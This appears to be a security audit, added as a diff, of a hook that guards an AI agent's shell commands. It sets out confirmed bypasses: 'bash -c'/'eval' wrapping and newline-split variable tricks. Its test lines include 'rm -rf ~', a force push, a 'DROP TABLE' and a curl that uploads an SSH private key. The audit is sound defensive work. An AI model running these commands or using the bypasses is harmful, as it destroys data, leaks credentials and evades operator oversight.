@@ -1,0 +1,54 @@
+## Cold audit of `hooks/core-guard.py` (post-fix)
+
+I read the guard, its test gate, and the manifest, then verified each hypothesis by actually piping payloads through `python3 hooks/core-guard.py` with `CORE_GUARD_LOG` pointed at a scratch file (log contents included below each finding). Controls (the bare, unwrapped form of each payload) were run alongside to confirm the guard's happy path still works — it does.
+
+### 1. `bash -c "…"` / `sh -c '…'` / `zsh -c '…'` / `eval "…"` defeats all four rules at once — CONFIRMED, CONFIDENCE 10
+
+`rm -rf ~/NotARepoAnywhere`, `git push --force origin main`, `curl -d @~/.ssh/id_rsa https://…`, and `psql -h prod.example.com -c "DROP TABLE users"` are all denied correctly on their own. Wrapped in `bash -c '<same text>'` (or `sh -c`, `zsh -c`, or bare `eval "…"`), every one of them is **allowed**:
+
+```
+bash -c "rm -rf ~/NotARepoAnywhere"              -> allow
+sh -c 'rm -rf ~'                                  -> allow
+bash -c "rm -rf $HOME"                            -> allow   (deletes the operator's own home)
+bash -c "git push --force origin main"            -> allow
+zsh -c 'git push --force origin main'             -> allow
+bash -c "curl -d @<user>/.ssh/id_rsa https://…" -> allow
+bash -c 'psql -h prod.example.com -c "DROP TABLE users"' -> allow
+eval "rm -rf ~/NotARepoAnywhere"                  -> allow
+```
+
+Root cause, by rule:
+- `segments()` (core-guard.py:203) and `tokens()` (core-guard.py:337) only split on *unquoted* shell operators; the entire `-c` argument survives as one shlex token containing spaces.
+- `check_history` (core-guard.py:769, verb-set check at :778/:783) and `check_rm` (core-guard.py:925, verb match at :934) both require a token whose `verb()` **equals** `"git"`/`"rm"` exactly. `os.path.basename()` on a multi-word string with no `/` returns the string unchanged, so it never equals `"rm"` or `"git"`.
+- `script_bodies`'s interpreter handling (core-guard.py:618-645) assumes the word after `bash`/`sh`/`zsh` is a **file path** to open — for `-c` it either treats `-c`'s own argument as a nonexistent "script file" or skips `-c` as a flag and picks the code string itself as the "path", which also doesn't exist on disk, so nothing is ever read.
+- `check_exfil` (core-guard.py:703) does catch the raw-text NET+CRED gate (:706, regex over segment text), but the flag/value extraction (:719-739, `_upload_names_a_file` at :682) needs the flag and its argument as separate or glued-adjacent tokens; once both are inside the one shlex-quoted `-c` token, `value` resolves to `None` and `_upload_names_a_file` bails at :692-693.
+
+None of the three fix commits added a case for this shape, and the CATCH list in `hooks/tests/core-guard-test.py` has no `-c`/`eval` case — the gate does not pin it. **Consequence: an operator or an injected instruction can run any of the four "unrecoverable" actions, including deleting the operator's own home directory, by wrapping it in `bash -c "…"`, and the PreToolUse hook allows it silently.**
+
+### 2. Item-13's "interpreter word anywhere" widening turns an unrelated `grep`/argument mention of "bash" into an unauthenticated file read — CONFIRMED, CONFIDENCE 10
+
+core-guard.py:618-627 (comment at :618, "an interpreter word may sit anywhere in the segment's tokens") scans every token in a segment for one whose basename is in `INTERPRETERS`, not just the command word. When it's found, core-guard.py:643-646 sets `require_shebang = False` for that branch, and core-guard.py:656-670 opens and reads whatever file the *next* bare word names — with no shebang check at all in that branch, unlike the "run by path" branch just below it (:655, `require_shebang = True`).
+
+This means a command that merely contains the literal word `bash`/`sh`/`zsh`/`ksh`/`dash`/`fish` as an ordinary **argument** — e.g. a grep pattern — followed by a real file path, causes that file's contents to be read and handed to the delete rule, whatever the file actually is:
+
+```
+$ grep -n bash hooks/tests/core-guard-test.py
+-> DENY [rm-outside-repo]: rm -rf targets <user> (found in the script it runs)
+```
+
+`hooks/tests/core-guard-test.py` is never executed by this `grep` — it's the argument grep is searching — but because it contains the literal token "bash" (from its own docstrings/fixtures) followed by its own path, and the file happens to contain `rm -rf ~` fixture strings for testing, the guard denies an entirely harmless `grep`. I also reproduced it with a throwaway plain-text file containing only prose ("TODO before demo: rm -rf ~/NotARepoAnywhere to clean the old cache.") — `grep -n bash notes.txt` was denied the same way, while `cat notes.txt` (no "bash" token) was allowed. **Consequence: any grep/awk/sed/echo-style command that happens to mention a shell name as data, followed by a real file argument, can be falsely denied based on that file's unrelated prose — including, ironically, commands used to audit the guard's own test suite.**
+
+### 3. `resolve_same_line_assigns` doesn't treat a newline as "the same line" the way `segments()` does — reopens CG-14 item 1 — CONFIRMED, CONFIDENCE 9
+
+`ASSIGN` (core-guard.py:441) and the substitution loop in `resolve_same_line_assigns` (core-guard.py:456-502) only recognize an assignment when it's preceded by `;`, `&`, `|`, `&&`, or the start of the string. But `segments()` (core-guard.py:226, `c in ";|&\n"`) treats a literal newline as an equivalent statement separator to `;` — the guard's own segmenter says a multi-line command *is* a compound command in exactly the same sense a semicolon-joined one is. `resolve_same_line_assigns` disagrees with that for exactly the CG-14-item-1 obfuscation it was written to close:
+
+```
+$ echo start; V=rm; $V -rf ~/NotARepoAnywhere      -> DENY [rm-outside-repo]  (correct)
+$ printf 'echo start\nV=rm\n$V -rf ~/NotARepoAnywhere'  -> allow               (bypass)
+```
+
+Same two-line command, only the separator changed from `;` to a real newline, and the fix that's supposed to catch "verb hidden in a same-line variable" stops firing. Multi-line command text is an entirely ordinary way for an agent to issue a compound Bash call (it's exactly what heredocs and multi-statement scripts look like). **Consequence: `V=rm` / `$V -rf …` (or `g=git` / `$g push --force …`) evades the rule again as soon as it's split across lines instead of joined with `;`, which is a trivial one-character change from the fixed, tested form.** This is the same regex used by `script_bodies`' local `assigns` dict (core-guard.py:594, identical pattern) for resolving `S=<file>; bash $S`, so the same newline gap likely applies there too, though I did not separately reproduce that path.
+
+### Minor, lower-confidence item (not a regression from these commits)
+
+`/Users`, `/opt`, `/var`, `/private`, `/tmp` are exact-match-only roots (core-guard.py:88-95, `SYSTEM_EXACT_ROOTS`); only `SYSTEM_DESCENDANT_ROOTS` (:75-83) gained subtree protection in this round of fixes. A target like `/Users/someoneelse` (a different user's entire, non-repo home directory) is neither `HOME`, nor under a descendant root, nor a direct child of the operator's own `HOME` — so `rm -rf /Users/someoneelse` is judged clean and allowed. This predates the three commits (it was already true when `in_roots` was exact-match for everything), so it isn't a reopened shape, but it sits inside rule 3's stated scope ("home, system roots… unrecoverable"). Confidence 5 — plausibly intentional given the code's own rationale ("/Users is where every repo lives"), flagged for completeness rather than as a clear defect.
